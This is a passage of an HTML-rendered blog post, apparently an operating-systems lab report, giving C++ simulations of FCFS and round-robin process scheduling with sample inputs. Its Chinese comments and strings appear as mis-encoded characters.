class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //è¿›ç¨‹ç»“æ„ä½“ï¼Œè¡¨ç¤ºè¿›ç¨‹ä¿¡æ¯</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//è¿›ç¨‹åå­—</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//åˆ°è¾¾æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//è¿›ç¨‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//è¿›ç¨‹ç­‰å¾…æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//å‘¨è½¬æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//è¿›ç¨‹ç»“æŸæ—¶é—´</span><br>    <span class="hljs-comment">//int time_slice;      //è¿›ç¨‹æ—¶é—´ç‰‡</span><br>&#125; run_process, p[MAXname];<br><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//å½“å‰æ—¶é—´</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹åˆå§‹åŒ–</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¿›ç¨‹æ•°é‡&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥ç¬¬&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;ä¸ªè¿›ç¨‹çš„åå­—  åˆ°è¾¾æ—¶é—´  æœåŠ¡æ—¶é—´&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//å½“å‰æ— è¿›ç¨‹è¿è¡Œ</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//å°†è¿›ç¨‹åŠ å…¥é˜»å¡é˜Ÿåˆ—ï¼ˆæœªè¾¾åˆ°åˆ™è§†ä¸ºé˜»å¡ï¼‰</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//å½“å°±ç»ªé˜Ÿåˆ—éç©ºæ—¶</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//å–ä¸‹ä¸ªè¿›ç¨‹</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//è®¡ç®—ç­‰å¾…æ—¶é—´</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//å¦åˆ™å°†è¿è¡Œè¿›ç¨‹ç½®ä¸ºç©º</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//é˜»å¡å‡½æ•°ï¼Œéšæœºæ¦‚ç‡é˜»å¡</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹è°ƒåº¦å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//éšæœºæ•°ç§å­</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFSè°ƒåº¦ç®—æ³•------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å½“å‰æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å½“å‰è¿›ç¨‹  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åˆ°è¾¾æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‰©ä½™è¿è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å½“ä¸‰ä¸ªé˜Ÿåˆ—å‡ä¸ºç©ºæ—¶ï¼Œè¯´æ˜è¿›ç¨‹å…¨éƒ¨è¿è¡Œå®Œ</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//ç»“æŸ</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//é˜»å¡é˜Ÿåˆ—éç©ºä¸”é˜Ÿé¦–å…ƒç´ åˆ°è¾¾æ—¶é—´å·²åˆ°å½“å‰æ—¶é—´</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//å°†è¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„æ—¶é—´ä½œä¸ºè¿›ç¨‹åˆ°è¾¾æ—¶é—´ï¼ˆé’ˆå¯¹äºé˜»å¡è¿‡çš„è¿›ç¨‹ï¼‰</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//åˆ™åŠ å…¥å°±ç»ªé˜Ÿåˆ—</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//ä»é˜»å¡é˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å°±ç»ªé˜Ÿåˆ—éç©ºå’Œè¿è¡Œè¿›ç¨‹ä¸ºç©ºæ—¶</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//åˆ™ä»å°±ç»ªå¯¹åˆ—å–é¦–å…ƒç´ </span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//ä»å°±ç»ªé˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//è‹¥å½“å‰æ— è¿è¡Œè¿›ç¨‹ï¼Œåˆ™è¾“å‡ºç©º</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//å½“å‰æœ‰è¿è¡Œè¿›ç¨‹åˆ™è¾“å‡ºä¿¡æ¯</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//å½“å‰æ—¶é—´åŠ 1</span><br>            run_process.remain_time--; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´å‡1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´ä¸º0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//å½“è¿›ç¨‹æœ‰è¿è¡Œæ—¶é—´å’Œæ—¶é—´ç‰‡æ—¶ï¼Œå¯èƒ½å‘ç”Ÿé˜»å¡</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------è¿›ç¨‹é˜»å¡ï¼Œåˆ‡æ¢è¿›ç¨‹----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//è‹¥å‘ç”Ÿé˜»å¡ï¼Œä¿®æ”¹å½“å‰è¿›ç¨‹åˆ°è¾¾æ—¶é—´</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å¹¶åŠ å…¥é˜»å¡é˜Ÿåˆ—ä¸­</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åå­—  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;åˆ°è¾¾æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å¼€å§‹æ‰§è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;ç»“æŸæ‰§è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‘¨è½¬æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å¹³å‡ç­‰å¾…æ—¶é—´ä¸ºï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p><strong>ä¸è€ƒè™‘é˜»å¡ï¼š</strong></p><p>åˆå€¼ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="/posts/3f961b4f/image-20211112212432678.png" alt="image-20211112212432678"></p><p><strong>è€ƒè™‘é˜»å¡ï¼š</strong></p><p>åˆå€¼ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/posts/3f961b4f/image-20211112212806073.png" alt="image-20211112212806073"></p><h3 id="rrè°ƒåº¦ç®—æ³•"><a class="markdownIt-Anchor" href="#rrè°ƒåº¦ç®—æ³•"></a> RRè°ƒåº¦ç®—æ³•</h3><h4 id="æ•°æ®ç»“æ„-2"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„-2"></a> æ•°æ®ç»“æ„</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //è¿›ç¨‹ç»“æ„ä½“ï¼Œè¡¨ç¤ºè¿›ç¨‹ä¿¡æ¯</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//è¿›ç¨‹åå­—</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//åˆ°è¾¾æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//è¿›ç¨‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//è¿›ç¨‹ç­‰å¾…æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//å‘¨è½¬æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//è¿›ç¨‹ç»“æŸæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//è¿›ç¨‹æ—¶é—´ç‰‡</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br></code></pre></div></td></tr></table></figure><h4 id="ç¬¦å·è¯´æ˜-2"><a class="markdownIt-Anchor" href="#ç¬¦å·è¯´æ˜-2"></a> ç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//å½“å‰æ—¶é—´</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//è®¾å®šçš„æ—¶é—´ç‰‡å¤§å°</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜-2"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜-2"></a> å‡½æ•°è¯´æ˜</h4><blockquote><p>å‡½æ•°è®¾è®¡åŸºæœ¬å’ŒFCFSç›¸åŒ</p></blockquote><blockquote><p>å°‘æ•°çš„ä¸åŒä¹‹å¤„æ˜¯</p><ul><li>è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°åŠ ä¸Šäº†æ—¶é—´ç‰‡çš„åˆå§‹åŒ–</li></ul></blockquote><blockquote><ul><li>è¿›ç¨‹è°ƒåº¦å‡½æ•°åŠ ä¸Šäº†æ—¶é—´ç‰‡ç”¨å®Œæ—¶çš„è¿›ç¨‹åˆ‡æ¢</li><li>æ—¶é—´ç‰‡ç”¨å®Œæ—¶å›å¤å½“å‰è¿›ç¨‹çš„æ—¶é—´ç‰‡ï¼ŒåŒæ—¶æ›´æ–°åˆ°è¾¾æ—¶é—´ï¼Œå¹¶å°†å…¶å†æ¬¡å…¥é˜Ÿ</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">procese_schedule</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    `````````<span class="hljs-comment">//çœç•¥éƒ¨åˆ†å…·ä½“è§æºä»£ç </span><br>    `````````<br>        current_time++;            <span class="hljs-comment">//å½“å‰æ—¶é—´åŠ 1</span><br>            run_process.remain_time--; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´å‡1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//è¿›ç¨‹æ—¶é—´ç‰‡æ—¶é—´å‡1</span><br><span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´ä¸º0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹æ—¶é—´ç‰‡ä¸º0æ—¶</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//æ¢å¤æ—¶é—´ç‰‡</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//æ›´æ–°åˆ°è¾¾æ—¶é—´</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å†æ¬¡å…¥é˜Ÿ</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//å½“è¿›ç¨‹æœ‰è¿è¡Œæ—¶é—´å’Œæ—¶é—´ç‰‡æ—¶ï¼Œå¯èƒ½å‘ç”Ÿé˜»å¡</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------è¿›ç¨‹é˜»å¡ï¼Œåˆ‡æ¢è¿›ç¨‹----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//è‹¥å‘ç”Ÿé˜»å¡ï¼Œä¿®æ”¹å½“å‰è¿›ç¨‹åˆ°è¾¾æ—¶é—´</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å¹¶åŠ å…¥é˜»å¡é˜Ÿåˆ—ä¸­</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>    `````````<span class="hljs-comment">//çœç•¥éƒ¨åˆ†å…·ä½“è§æºä»£ç </span><br>    `````````<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç -2"><a class="markdownIt-Anchor" href="#æºä»£ç -2"></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 